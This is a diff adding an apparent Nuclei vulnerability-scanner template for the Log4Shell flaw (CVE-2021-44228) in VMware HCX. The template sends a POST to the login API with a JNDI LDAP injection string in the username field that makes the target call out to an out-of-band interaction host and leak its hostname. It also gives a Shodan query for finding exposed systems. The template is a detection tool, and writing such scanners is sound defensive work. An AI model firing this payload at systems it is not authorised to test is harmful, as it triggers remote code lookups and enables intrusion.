@@ -1,0 +1,70 @@
+id: vmware-hcx-log4j
+
+info:
+  name: VMware HCX - Remote Code Execution (Apache Log4j)
+  author: pussycat0x,DhiyaneshDK
+  severity: critical
+  description: VMware HCX is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+  reference:
+    - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"VMware HCX"
+  tags: cve,cve2021,rce,jndi,log4j,vmware,kev,oast
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - raw:
+      - |
+        @timeout: 10s
+        POST /hybridity/api/sessions HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        Content-Type: application/json
+        Origin: {{BaseURL}}
+
+        {
+          "authType": "password",
+          "username": "${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}",
+          "password": "admin"
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+# digest: 490a0046304402206d8c65c5af5bc63309ceeab54b89196bd24d5210cd95023de77e953a7c2dc4c902200aa04b3cec163ef7bfb4a9128bcfd4e0dde17e0b95d9e45d094c8961f6fc0f25:922c64590222798bb761d5b6d8e72950
